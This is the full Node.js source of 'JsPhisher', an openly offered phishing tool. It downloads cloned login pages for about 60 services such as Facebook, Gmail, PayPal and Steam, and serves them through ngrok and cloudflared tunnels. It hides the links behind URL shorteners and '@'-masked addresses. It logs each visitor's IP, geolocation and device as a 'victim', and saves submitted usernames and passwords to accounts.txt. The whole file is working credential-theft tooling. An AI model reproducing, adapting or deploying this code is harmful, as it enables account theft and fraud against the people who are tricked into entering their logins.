/**
 * JsPhisher - Easy phishing tool
 * Coded by: @gamerboytr
 * License: GPL-3.0
 * Its a open-source project
 * Please report any bugs to: https://github.com/gamerboytr/JsPhisher/issues
 */

"use strict";
try {
	require("axios");
} catch (e) {
	console.clear();
	if (e.code !== "MODULE_NOT_FOUND") {
		throw e;
	}
	console.log("You don't have modules installed.");
	console.log("Installing dependencies...");
	try {
		require("child_process").execSync("yarn install");
		console.log("Used yarn to install dependencies.");
	} catch {
		require("child_process").execSync("npm install");
	}
	console.log("Installed all dependencies.");
}
const express = require("express");
const bodyParser = require("body-parser");
const readlineSync = require("readline-sync");
const geoip = require("geoip-lite");
const chalk = require("chalk");
const agentParser = require("ua-parser-js");
const { execSync, spawn } = require("child_process");
const cliProgress = require("cli-progress");
const request = require("request");
const AdmZip = require("adm-zip");
const axios = require("axios").default;
const app = express();
const port = process.env.PORT || process.env.NODE_PORT || 6969;
const path = require("path");
const fs = require("fs");

const VERSION = "1.3.1";
const isTermux = process.platform === "android";
const isLinux = process.platform === "linux" || isTermux;
const logAsk = chalk.greenBright`[{whiteBright ?}]`;
const logSuccess = chalk.yellowBright`[{whiteBright √}]`;
const logError = chalk.redBright`[{whiteBright !}]`;
const logInfo = chalk.yellowBright`[{whiteBright +}]`;
const logInfo2 = chalk.greenBright`[{whiteBright •}]`;
const botDetecter = /(Discordbot|facebookexternalhit|WhatsApp)/gi;
const availableSites = {
	Adobe: "adobe",
	Airtelsim: "airtelsim",
	Amazon: "amazon",
	Apple: "apple",
	Badoo: "badoo",
	"Clash of Clans": "clashofclans",
	DeviantArt: "deviantart",
	Discord: "discord",
	Dropbox: "dropbox",
	eBay: "ebay",
	Facebook: "facebook",
	"Facebook Advenced": "fb_advanced",
	Messenger: "fb_messenger",
	"Facebook Security": "fb_security",
	FreeFire: "freefire",
	Github: "github",
	Gitlab: "gitlab",
	Gmail: "gmail",
	Google: "google",
	"Google Poll": "google_poll",
	iCloud: "icloud",
	"Insta Auto Followers": "ig_followers",
	"Insta 1000 Followers": "insta_followers",
	Instagram: "instagram",
	Jiorouter: "jiorouter",
	LinkedIn: "linkedin",
	Mediafire: "mediafire",
	Microsoft: "microsoft",
	Myspace: "myspace",
	Netflix: "netflix",
	Origin: "origin",
	Outlook: "outlook",
	Paypal: "paypal",
	Pinterest: "pinterest",
	Playstation: "playstation",
	Protonmail: "protonmail",
	Pubg: "pubg",
	Quora: "quora",
	Reddit: "reddit",
	Roblox: "roblox",
	Shopify: "shopify",
	Shopping: "shopping",
	Snapchat: "snapchat",
	Snapchat2: "snapchat2",
	SocialClub: "socialclub",
	Spotify: "spotify",
	Stackoverflow: "stackoverflow",
	Steam: "steam",
	Telegram: "telegram",
	TikTok: "tiktok",
	Twitch: "twitch",
	Twitter: "twitter",
	Verizon: "verizon",
	VK: "vk",
	"VK Poll": "vk_poll",
	"Wi-Fi": "wifi",
	Wordpress: "wordpress",
	Yahoo: "yahoo",
	Yandex: "yandex",
};
let siteConfig = {};

const logLogo =
	chalk.red`       _     _____  _     _     _               \n` +
	chalk.cyan`      | |   |  __ \\| |   (_)   | |              \n` +
	chalk.yellow`      | |___| |__) | |__  _ ___| |__   ___ _ __ \n` +
	chalk.blue`  _   | / __|  ___/| '_ \\| / __| '_ \\ / _ \\ '__|\n` +
	chalk.red` | |__| \\__ \\ |    | | | | \\__ \\ | | |  __/ |   \n` +
	chalk.yellow`  \\____/|___/_|    |_| |_|_|___/_| |_|\\___|_|\n` +
	chalk.cyan`				     ${VERSION.length === 3 ? "  " : ""}[v${VERSION}]	  \n` +
	chalk.red`			      [By GamerboyTR]	  \n`;

console.clear();
console.log(logLogo);
const loggedIps = [];
if (process.platform === "darwin") {
	console.log(chalk.redBright`${logError} You are running on a Mac. This is not supported.`);
	process.exit(1);
}

app.use(bodyParser.urlencoded({ extended: true }));
app.disable("x-powered-by");

(async () => {
	await controlVersion().catch(throwError);
	await installRequirements().catch(throwError);
	if (process.platform !== "win32") {
		process.on("SIGINT", _ => onExit());
	}
	siteConfig = (await selectSite().catch(throwError)).config;
	startServer();
})();

app.all(/(.*)/, async (req, res, next) => {
	const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
	const userAgent = req.headers["user-agent"];
	const ua = agentParser(userAgent);
	const referer = req.headers?.referer;
	const location = geoip.lookup(ip);
	const { data: request } = await axios.get(`https://ipwhois.app/json/${ip}`).catch(throwError);
	if (req.url.split("?")[0] === "/") {
		res.redirect(301, "/login");
	} else {
		next();
	}
	if (ip !== "::1" && !botDetecter.test(userAgent) && !loggedIps.includes(ip) && request.type && location?.city) {
		console.clear();
		console.log(logLogo);
		console.log(chalk.greenBright`${logSuccess} Victim IP found!\n`);

		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} IP                   :  ${ip}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} IP Type              :  ${request.type}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} User OS              :  ${ua.os?.name ? `${ua.os.name} ${ua.os.version}` : "Unknown"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Browser              :  ${ua.browser?.name ?? "Unknown"} ${ua.browser?.version}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Location             :  ${request?.city ?? "Unknown"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} GeoLocation(lat, lon):  ${location.ll.join(", ")}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Curreny              :  ${request.currency_code}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Referer              :  ${referer ?? "No referer"}`);
		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} UserAgent            :  ${userAgent ?? "No agent"}\n`);

		loggedIps.push(ip);
		fs.appendFileSync(
			"./ip.txt",
			[
				`========================${siteConfig.name.toUpperCase()} ${new Date().toLocaleString()}========================`,
				`IP: ${ip}`,
				`IP Type: ${request.type}`,
				`User OS: ${ua.os?.name ? `${ua.os.name} ${ua.os.version}` : "Unknown"}`,
				`Browser: ${ua.browser?.name ?? "Unknown"} ${ua.browser?.version}`,
				`Location: ${request?.city ?? "Unknown"}`,
				`GeoLocation(lat, lon): ${location.ll.join(", ")}`,
				`Curreny: ${request.currency_code}`,
				`Referer: ${referer ?? "No referer"}`,
				`UserAgent: ${userAgent ?? "No agent"}`,
				"",
			].join("\n")
		);
		console.log(chalk.cyan`${logInfo} Saved in ip.txt\n`);
		console.log(chalk.cyan`${logInfo} Waiting for next... {cyanBright Press {red Ctrl+C} to exit}`);
	}
});

app.post(["/login", "/login.php"], (req, res) => {
	const { username, password } = req.body;
	if (!username?.trim?.() || !password?.trim?.()) {
		res.redirect("login");
		return;
	}
	res.redirect(siteConfig?.redirect ?? "https://google.com");
	console.log(chalk.greenBright`${logSuccess} Victim login info found!\n`);

	console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} ${siteConfig?.name ?? "Victim"} Username:  ${username}`);
	console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} ${siteConfig?.name ?? "Victim"} Password:  ${password}\n`);

	fs.appendFileSync("./accounts.txt", `========================${siteConfig.name.toUpperCase()} ${new Date().toLocaleString()}========================\nUsername : ${username}\nPassword : ${password}\n`);
	console.log(chalk.cyan`${logInfo} Saved in accounts.txt\n`);
	console.log(chalk.cyan`${logInfo} Waiting for next... {cyanBright Press {red Ctrl+C} to exit}`);
});

//! Functions

function controlVersion() {
	return new Promise(async (resolve, reject) => {
		const { data: readme } = await axios.get("https://raw.githubusercontent.com/gamerboytr/JsPhisher/master/README.md").catch(reject);
		const version = readme.match(/Version-(.*?)-green/)[1];
		const changelogRequest = await axios.get(`https://raw.githubusercontent.com/gamerboytr/JsPhisher/master/CHANGELOG.md`).catch(() => {});
		const changelog = changelogRequest?.data;
		if (version !== VERSION) {
			console.clear();
			console.log(logLogo);
			console.log(chalk.redBright`${logError} New version available!\n`);
			console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Current version:  ${VERSION}`);
			console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} New version:      ${version}\n`);
			console.log(chalk.yellow`${logAsk} Do you want to update? {yellowBright (y/n)}`);
			if (readlineSync.keyInYN("")) {
				console.clear();
				console.log(logLogo);
				console.log(chalk.greenBright`${logSuccess} Updating...\n`);
				console.log(chalk.yellow`${logInfo} Downloading repo...`);
				const currentDir = process.cwd().replaceAll("\\", "/").split("/")[process.cwd().replaceAll("\\", "/").split("/").length - 2];
				execSync(`cd ../.. && ${isLinux ? `rm -rf ${currentDir}` : `rmdir /S /Q ${currentDir}`} && git clone https://github.com/gamerboytr/JsPhisher`);
				console.log(chalk.yellow`${logInfo} Updated!\n`);
				console.log(chalk.yellow`${logInfo} Please restart terminal manually.\n`);
				if (changelog) {
					console.log(chalk.yellow`${logInfo} Changelog:\n`);
					console.log(chalk.yellow(changelog));
				}
				process.exit();
			} else {
				console.clear();
				console.log(logLogo);
				console.log(chalk.greenBright`${logSuccess} Using old version.\n`);
			}
		}
		resolve();
	});
}

function getArch() {
	let arch = process.arch;
	if (isLinux) {
		if (arch === "x64") {
			arch = "amd64";
		} else if (arch === "x32") {
			arch = "amd";
		}
	} else {
		if (arch === "x32") {
			arch = "386";
		}
	}
	return arch;
}

function installRequirements() {
	return new Promise(async (resolve, reject) => {
		console.clear();
		console.log(logLogo);
		//! Ngrok
		if (!fs.existsSync(path.join(__dirname, "bin", `ngrok${!isLinux ? ".exe" : ""}`))) {
			console.log(chalk.yellow`${logInfo2} Downloading ngrok...`);
			const ngrokLink = `https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-${isLinux ? `linux-${getArch()}.tgz` : "windows-386.zip"}`;
			try {
				await downloadFile(ngrokLink, path.join(__dirname, "bin", `ngrok${isLinux ? ".tgz" : ".zip"}`)).catch(reject);
				console.log(chalk.yellow`${logSuccess} Downloaded!\n`);
				console.log(chalk.yellow`${logInfo2} Extracting...`);
				if (isLinux) {
					execSync(`tar -xvf ${path.join(__dirname, "bin", "ngrok.tgz")} -C ${path.join(__dirname, "bin")}`);
					fs.unlinkSync(path.join(__dirname, "bin", "ngrok.tgz"));
				} else {
					new AdmZip(path.join(__dirname, "bin", "ngrok.zip")).extractAllTo(path.join(__dirname, "bin"));
					fs.unlinkSync(path.join(__dirname, "bin", "ngrok.zip"));
				}
				console.log(chalk.yellow`${logSuccess} Extracted!\n`);
			} catch {
				console.log(chalk.redBright`${logError} Failed to download ngrok!\n`);
				console.log(chalk.yellow`${logInfo} Please download it manually\n`);
			}
		}
		//! Cloudflared
		if (!fs.existsSync(path.join(__dirname, "bin", `cloudflared${!isLinux ? ".exe" : ""}`))) {
			console.log(chalk.yellow`${logInfo2} Downloading cloudflared...`);
			const cloudflaredLink = `https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-${isLinux ? `linux-${getArch()}` : "windows-386.exe"}`;
			try {
				await downloadFile(cloudflaredLink, path.join(__dirname, "bin", `cloudflared${!isLinux ? ".exe" : ""}`)).catch(reject);
				console.log(chalk.yellow`${logSuccess} Downloaded!\n`);
				if (isLinux) {
					execSync(`chmod +x ${path.join(__dirname, "bin", "cloudflared")}`);
				}
			} catch {
				console.log(chalk.redBright`${logError} Failed to download cloudflared!\n`);
				console.log(chalk.yellow`${logInfo} Please download it manually\n`);
			}
		}
		resolve();
	});
}

function openNgrok(port) {
	return new Promise(async (resolve, reject) => {
		if (!fs.existsSync(path.join(__dirname, "bin", `ngrok${!isLinux ? ".exe" : ""}`))) {
			return reject(new Error("Cannot found ngrok!"));
		}
		spawn("bin/ngrok", ["http", port]);
		await new Promise(resolve => setTimeout(resolve, 3000));
		let ngrokUrl;
		while (!ngrokUrl) {
			try {
				const req = await axios.get("http://127.0.0.1:4040/api/tunnels").catch(() => {});
				if (req?.data?.tunnels?.[0]?.public_url) {
					ngrokUrl = (req.data.tunnels?.[1] ?? req.data.tunnels?.[0]).public_url;
				} else {
					await new Promise(resolve => setTimeout(resolve, 1000));
				}
			} catch (e) {
				return reject(new Error(`Failed to start ngrok, please try again : ${e}`));
			}
		}
		resolve(ngrokUrl);
	});
}

function openCloudflared(port) {
	return new Promise((resolve, reject) => {
		if (!fs.existsSync(path.join(__dirname, "bin", `cloudflared${!isLinux ? ".exe" : ""}`))) {
			return reject(new Error("Cannot found cloudlfared!"));
		}
		let cfUrl;
		let cfShowed = false;
		let cfReady = false;
		spawn("bin/cloudflared", ["tunnel", "--url", `http://localhost:${port}`]).stderr.on("data", data => {
			if (data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/)) {
				cfUrl = data.toString().match(/https:\/\/(.*)\.trycloudflare\.com/);
			}
			cfReady = !!data.toString().match(/Connection (.*) registered/);
			if (cfReady && !cfShowed) {
				cfShowed = true;
				resolve(cfUrl[0]);
			}
		});
	});
}

function onExit(withoutLog = false) {
	if (!withoutLog) {
		console.log(chalk.yellowBright`\n${logInfo2} Thanks for using JsPhisher!\n`);
	}
	axios.delete("http://127.0.0.1:4040/api/tunnels/command_line").catch(() => {});
	axios.delete("http://127.0.0.1:4040/api/tunnels/command_line%20%28http%29").catch(() => {}); //! For HTTPS
	process.exit();
}

function throwError(error) {
	console.log(chalk.redBright`${logError} ${error}\n`);
	onExit(true);
}

function selectSite() {
	return new Promise(async resolve => {
		Object.keys(availableSites).forEach((site, index) => {
			const maxLength = Math.max(...Object.keys(availableSites).map(s => s.length)) + 10;
			let spacing = " ".repeat(maxLength);
			spacing = spacing.substring(0, maxLength - site.length);
			spacing = ((index + 1) / 3) % 1 === 0 ? "\n" : spacing;
			process.stdout.write(chalk.yellowBright`{greenBright [}{whiteBright ${index + 1 < 10 ? "0" + (index + 1) : index + 1}}{greenBright ]} ${site}${spacing}`);
		});
		console.log(chalk.yellowBright`\n\n{greenBright [}{whiteBright X}{greenBright ]} About                  {greenBright [}{whiteBright 0}{greenBright ]} Exit\n`);
		const choose = readlineSync.prompt({ prompt: chalk.yellowBright`${logAsk} Select one of the options > ` });
		if (choose === "0") {
			onExit(true);
		} else if (choose === "X" || choose === "x") {
			scriptAbout();
			return;
		} else if (!choose || isNaN(parseInt(choose)) || Object.keys(availableSites).length < parseInt(choose) || parseInt(choose) < 0) {
			console.clear();
			console.log(chalk.redBright`${logError} Invalid input.`);
			selectSite();
			return;
		}
		const folder = availableSites[Object.keys(availableSites)[parseInt(choose) - 1]];
		const config = await downloadSites(folder).catch(throwError);
		app.get("/login", (_req, res) => {
			res.sendFile(path.join(__dirname, "bin", "websites", folder, "login.html"));
		});
		app.use(express.static(path.join(__dirname, "bin", "websites", folder)));
		resolve({ site: folder, config });
	});
}

function downloadSites(folder) {
	return new Promise(async (resolve, reject) => {
		if (!fs.existsSync(path.join(__dirname, "bin", "websites", folder))) {
			console.log(chalk.yellowBright(`${logInfo} Downloading required files...`));
			try {
				if (!fs.existsSync(path.join(__dirname, "bin", "websites"))) {
					console.log(chalk.yellowBright(`${logInfo} Creating folder...`));
					fs.mkdirSync(path.join(__dirname, "bin", "websites"));
				}
				await downloadFile(`https://github.com/gamerboytr/files/raw/master/phishingsites/${folder}.zip?${Date.now()}`, path.join(__dirname, "bin", "websites", `${folder}.zip`)).catch(throwError);
				console.log(chalk.greenBright(`${logSuccess} Downloaded successfully.`));
				console.log(chalk.yellowBright(`${logInfo} Extracting files...`));
				new AdmZip(path.join(__dirname, "bin", "websites", folder + ".zip")).extractAllTo(path.join(__dirname, "bin", "websites", folder), true);
				console.log(chalk.greenBright(`${logSuccess} Extracted successfully.`));
				console.log(chalk.yellowBright(`${logInfo} Deleting zip file...`));
				fs.unlinkSync(path.join(__dirname, "bin", "websites", folder + ".zip"));
				console.log(chalk.greenBright(`${logSuccess} Deleted successfully.`));
			} catch (error) {
				console.log(chalk.redBright(`${logError} ${error}`));
				onExit(true);
			}
		}
		if (!fs.existsSync(path.join(__dirname, "bin", "websites", folder, "config.json"))) {
			reject(new Error("Cannot found config.json!"));
			return;
		}
		resolve(JSON.parse(fs.readFileSync(path.join(__dirname, "bin", "websites", folder, "config.json"), "utf8")));
	});
}

async function scriptAbout() {
	console.clear();
	console.log(logLogo);
	console.log(chalk.redBright`[ToolName]  {cyanBright :[JsPhisher]} `);
	console.log(chalk.redBright`[Version]   {cyanBright :[${VERSION}]}`);
	console.log(chalk.redBright`[Author]    {cyanBright :[GamerboyTR] }`);
	console.log(chalk.redBright`[Github]    {cyanBright :[https://github.com/gamerboytr] }`);
	console.log(chalk.redBright`[Discord]   {cyanBright :[https://discord.gg/turkishmethods] }`);
	console.log(chalk.redBright`[Email]     {cyanBright :[offical.gamerboytr@yandex.com]}\n`);
	console.log(chalk.yellowBright`{greenBright [}{whiteBright 0}{greenBright ]} Exit                     {greenBright [}{whiteBright 99}{greenBright ]}  Main Menu       `);
	const choose = readlineSync.prompt({ prompt: "\n > " });
	if (choose === "0") {
		onExit(true);
	} else if (choose === "99") {
		console.clear();
		console.log(logLogo);
		siteConfig = (await selectSite().catch(throwError)).config;
		startServer();
	} else {
		console.log(chalk.redBright`${logError} Invalid input.`);
		scriptAbout();
	}
}

async function startServer() {
	console.clear();
	console.log(logLogo);
	console.log(chalk.magenta`${logInfo2} Selected {bold ${siteConfig.name}}\n`);
	if (isTermux) {
		console.log(chalk.magenta`${logInfo} If you haven't enabled hotspot, please enable it!\n`);
		await new Promise(resolve => setTimeout(resolve, 1000));
	}
	console.log(chalk.magenta`${logInfo2} Initializing local server at {bold localhost:${port}}...\n`);
	await new Promise(resolve => {
		try {
			app.listen(port, _ => {
				console.log(chalk.cyan`${logInfo} Local server has started successfully!\n`);
				resolve();
			});
		} catch (e) {
			throwError(e);
		}
	});
	console.log(chalk.magenta`${logInfo2} Initializing tunnelers at same address...\n`);
	const ngrok = await openNgrok(port).catch(throwError);
	const shortNgrok = await shortLink(ngrok).catch(throwError);
	const cloudflared = await openCloudflared(port).catch(throwError);
	if (cloudflared) {
		const shortCf = await shortLink(cloudflared).catch(throwError);
		console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
		console.log(chalk.magenta`${logInfo2} URL 1 > {yellowBright ${cloudflared}}\n`);
		console.log(chalk.magenta`${logInfo2} URL 2 > {yellowBright ${siteConfig.mask + "@" + shortCf.split("/").slice(2).join("/")}}\n\n`);
	}
	console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
	console.log(chalk.magenta`${logInfo2} URL ${cloudflared ? 3 : 1} > {yellowBright ${ngrok}}\n`);
	console.log(chalk.magenta`${logInfo2} URL ${cloudflared ? 4 : 2} > {yellowBright ${siteConfig.mask + "@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
	console.log(chalk.cyan`${logInfo} Waiting for ip info... {cyanBright Press {red Ctrl+C} to exit}`);
}

function downloadFile(url, filePath) {
	return new Promise((resolve, reject) => {
		if (!fs.existsSync(path.dirname(filePath))) {
			fs.mkdirSync(path.dirname(filePath));
		}
		const progressBar = new cliProgress.SingleBar({ format: `Downloading [${chalk.cyanBright("{bar}")}] {percentage}% || ETA: {eta}s`, clearOnComplete: true, hideCursor: true }, cliProgress.Presets.shades_classic);
		const file = fs.createWriteStream(filePath);
		let receivedBytes = 0;
		request
			.get(url)
			.on("response", response => {
				if (response.statusCode < 200 || response.statusCode > 399) {
					reject(new Error(`Response status was ${response.statusCode}`));
					return;
				}
				progressBar.start(response.headers["content-length"], 0, { speed: "N/A" });
			})
			.on("data", chunk => {
				receivedBytes += chunk.length;
				progressBar.update(receivedBytes);
			})
			.pipe(file)
			.on("error", err => {
				if (fs.existsSync(filePath)) {
					fs.unlinkSync(filePath);
				}
				progressBar.stop();
				reject(err.message);
			});
		file.on("finish", () => {
			progressBar.stop();
			file.close(resolve);
		});
		file.on("error", err => {
			if (fs.existsSync(filePath)) {
				fs.unlinkSync(filePath);
			}
			progressBar.stop();
			reject(err.message);
		});
	});
}

function shortLink(url) {
	return new Promise(async (resolve, reject) => {
		try {
			const req = await axios.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`).catch(reject);
			resolve(req.data);
		} catch (e) {
			reject(e);
		}
	});
}
